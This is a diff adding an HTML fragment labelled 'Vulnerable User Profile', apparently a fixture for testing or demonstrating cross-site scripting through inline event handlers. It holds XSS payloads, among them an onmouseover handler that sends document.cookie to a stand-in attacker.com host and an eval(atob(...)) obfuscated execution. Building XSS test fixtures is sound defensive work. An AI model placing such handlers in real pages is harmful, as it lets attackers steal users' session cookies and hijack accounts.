@@ -1,0 +1,9 @@
+<div>
+    <h1>Vulnerable User Profile</h1>
+    <!-- Inline event handlers used as primary XSS execution vectors -->
+    <div onclick="alert('XSS Click')" style="color: blue;">Click to view profile</div>
+    <p onmouseover="fetch('http://attacker.com/steal?cookie=' + document.cookie)">Hover over this biography</p>
+    <a href="https://example.com" onfocus="maliciousPayload()" title="Account Settings">Settings</a>
+    <img src="https://example.com/avatar.jpg" onerror="alert('Image Load Failure XSS')" alt="User Avatar" />
+    <span oNlOaD="eval(atob('YWxlcnQoMSk='))">Status: Online</span>
+</div>
